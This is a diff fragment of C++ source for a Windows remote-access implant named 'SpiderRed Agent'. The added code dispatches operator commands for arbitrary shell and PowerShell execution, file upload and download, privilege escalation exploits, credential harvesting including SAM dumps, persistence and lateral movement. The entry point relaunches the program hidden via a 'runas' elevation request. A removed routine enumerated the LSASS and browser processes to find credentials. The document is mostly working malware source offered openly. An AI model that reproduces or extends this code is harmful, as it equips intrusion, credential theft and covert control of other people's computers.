+        std::vector<std::string> parts = Utils::Split(cmdline, ' ');
+        if (parts.empty()) return "Empty command";
+        
+        std::string cmd = parts[0];
+        std::string args;
+        for (size_t i = 1; i < parts.size(); i++) {
+            args += parts[i] + " ";
         }
         
-        return ss.str();
+        if (cmd == "info") {
+            return InfoCollector::CollectAll();
+        }
+        else if (cmd == "shell") {
+            return Utils::ExecuteCommand(args);
+        }
+        else if (cmd == "ps") {
+            return Utils::ExecutePowerShell(args);
+        }
+        else if (cmd == "upload") {
+            std::vector<std::string> files = Utils::Split(args, ' ');
+            if (files.size() >= 1) {
+                return FileModule::Upload(files[0]);
+            }
+            return "Usage: upload <file>";
+        }
+        else if (cmd == "download") {
+            std::vector<std::string> urls = Utils::Split(args, ' ');
+            if (urls.size() >= 2) {
+                return FileModule::Download(urls[0], urls[1]);
+            }
+            return "Usage: download <url> <path>";
+        }
+        else if (cmd == "privesc") {
+            if (args.find("check") != std::string::npos) {
+                return PrivilegeEscalation::CheckAll();
+            } else if (args.find("exploit") != std::string::npos) {
+                return PrivilegeEscalation::Exploit();
+            }
+            return "Usage: privesc <check|exploit>";
+        }
+        else if (cmd == "creds") {
+            if (args.find("all") != std::string::npos) {
+                return CredentialHarvester::HarvestAll();
+            } else if (args.find("sam") != std::string::npos) {
+                return CredentialHarvester::DumpSAM();
+            }
+            return "Usage: creds <all|sam>";
+        }
+        else if (cmd == "persist") {
+            return PersistenceModule::Establish();
+        }
+        else if (cmd == "lateral") {
+            if (args.find("shares") != std::string::npos) {
+                return LateralMovement::EnumerateShares();
+            }
+            return "Usage: lateral <shares>";
+        }
+        else if (cmd == "sleep") {
+            if (!args.empty()) {
+                try {
+                    int sec = std::stoi(args);
+                    Sleep(sec * 1000);
+                    return "Slept " + args + " seconds";
+                } catch (...) {}
+            }
+            return "Usage: sleep <seconds>";
+        }
+        else if (cmd == "exit") {
+            running = false;
+            return "Exiting...";
+        }
+        else {
+            return "Unknown command: " + cmd;
+        }
     }
+};
 
-    static std::string HarvestMemoryCredentials() {
-        std::stringstream ss;
+// ==================== MAIN ====================
+int main() {
+    #ifdef _DEBUG
+    AllocConsole();
+    FILE* f;
+    freopen_s(&f, "CONOUT$", "w", stdout);
+    #endif
+    
+    std::cout << "=== SpiderRed Agent ===\n";
+    
+    // Try elevation
+    if (!Utils::IsElevated()) {
+        char exePath[MAX_PATH];
+        GetModuleFileNameA(NULL, exePath, MAX_PATH);
         
-        // Check for LSASS process
-        ss << Utils::ExecuteCommand("tasklist | findstr /i lsass");
+        SHELLEXECUTEINFOA sei = { sizeof(sei) };
+        sei.lpVerb = "runas";
+        sei.lpFile = exePath;
+        sei.nShow = SW_HIDE;
         
-        // Check for other credential processes
-        ss << "\n[+] Processes with potential credentials:\n";
-        ss << Utils::ExecuteCommand("tasklist | findstr /i \"explorer chrome firefox outlook teams\"");
+        if (ShellExecuteExA(&sei)) {
+            return 0;
+        }
+    }
+    
+    try {
+        SpiderRedAgent agent;
+        agent.Start();
+        
+        while (true) {
+            Sleep(10000);
+        }
+        
+    } catch (const std::exception& e) {
+        std::cerr << "Error: " << e.what() << std::endl;
+        return 1;
+    }
+    
+    return 0;
+}
